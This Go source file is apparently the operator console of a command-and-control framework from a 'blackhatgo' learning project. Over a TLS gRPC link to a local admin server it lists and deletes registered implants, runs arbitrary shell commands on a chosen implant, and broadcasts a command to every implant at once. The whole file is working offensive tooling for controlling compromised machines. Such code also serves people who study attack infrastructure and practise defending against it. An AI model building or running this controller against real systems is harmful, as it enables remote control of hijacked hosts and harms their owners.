package main

import (
	"blackhatgo/c2c/grpcapi"
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"text/tabwriter"

	"github.com/urfave/cli/v3"
	"google.golang.org/grpc"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.AdminClient
	)

	creds, err := loadTLSClientCreds()
	if err != nil {
		log.Fatalln(err)
	}
	opts = append(opts, grpc.WithTransportCredentials(creds))
	// opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if conn, err = grpc.NewClient(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewAdminClient(conn)
	ctx := context.Background()

	cmdFlags := &cli.Command{
		Commands: []*cli.Command{
			{
				Name:  "list",
				Usage: "List implants",
				Action: func(ctx context.Context, c *cli.Command) error {
					req := &grpcapi.Empty{}
					implantsList, err := client.ListRegisteredImplants(ctx, req)
					if err != nil {
						return err
					}
					if len(implantsList.Implants) == 0 {
						fmt.Println("No implants")
						return nil
					}
					w := tabwriter.NewWriter(os.Stdout, 0, 8, 2, ' ', tabwriter.Debug)
					fmt.Fprintln(w, "ID\tIP ADDRESS\tLAST SEEN\tSTATUS")

					for _, implant := range implantsList.Implants {
						fmt.Fprintf(w, "%s\t%s\t%s\t%s\n",
							implant.Id,
							implant.IpAddress,
							implant.LastSeen,
							implant.Status,
						)
					}

					// 3. Flush to the terminal
					w.Flush()

					return nil
				},
			},
			{
				Name:      "delete",
				Usage:     "Remove an implant from the server",
				ArgsUsage: "[implant-id]",
				Action: func(ctx context.Context, c *cli.Command) error {
					if c.Args().Len() < 1 {
						return fmt.Errorf("error: you must provide an implant ID")
					}
					id := c.Args().First()

					deleteRequest := &grpcapi.DeleteRequest{
						Id: id,
					}
					_, err := client.DeleteImplant(ctx, deleteRequest)
					if err != nil {
						return err
					}

					return nil
				},
			},
			{
				Name:      "exec",
				Usage:     "Execute a shell command on a specific implant",
				ArgsUsage: "<implant-id> <command>",
				Action: func(ctx context.Context, c *cli.Command) error {
					// 1. Check for minimum arguments: [ID] [Command...]
					if c.Args().Len() < 2 {
						return fmt.Errorf("error: you must provide both an implant ID and a command")
					}

					// 2. The first argument is the ID
					targetID := c.Args().First()

					// 3. Join all remaining arguments into a single string.
					// This handles commands with spaces like: exec <ID> ls -la /etc
					instruction := strings.Join(c.Args().Slice()[1:], " ")

					// 4. Construct the request
					req := &grpcapi.Command{
						ImplantId: targetID,
						In:        instruction,
					}

					fmt.Printf("[*] Tasking %s to run: %s\n", targetID, instruction)

					// 5. Call the gRPC server
					res, err := client.RunCommand(ctx, req)
					if err != nil {
						return fmt.Errorf("command failed: %v", err)
					}

					// 6. Print the results
					fmt.Printf("[+] Results from %s:\n%s\n", targetID, res.Out)

					return nil
				},
			},
			{
				Name:  "broadcast",
				Usage: "Send a command to ALL registered implants",
				Action: func(ctx context.Context, c *cli.Command) error {
					instruction := strings.Join(c.Args().Slice(), " ")
					if instruction == "" {
						return fmt.Errorf("error: what command do you want to broadcast?")
					}

					list, err := client.ListRegisteredImplants(ctx, &grpcapi.Empty{})
					if err != nil {
						return err
					}

					fmt.Printf("[*] Broadcasting '%s' to %d implants...\n", instruction, len(list.Implants))

					var wg sync.WaitGroup
					for _, imp := range list.Implants {
						wg.Add(1)

						go func(implantID string) {
							defer wg.Done()

							req := &grpcapi.Command{
								ImplantId: implantID,
								In:        instruction,
							}

							res, err := client.RunCommand(ctx, req)
							if err != nil {
								fmt.Printf("[!] %s: Failed -> %v\n", implantID, err)
								return
							}
							fmt.Printf("[+] %s: Output -> %s\n", implantID, res.Out)
						}(imp.Id)
					}

					wg.Wait()
					fmt.Println("[*] Broadcast complete.")
					return nil
				},
			},
		},
	}

	if err := cmdFlags.Run(ctx, os.Args); err != nil {
		log.Fatal(err)
	}
}
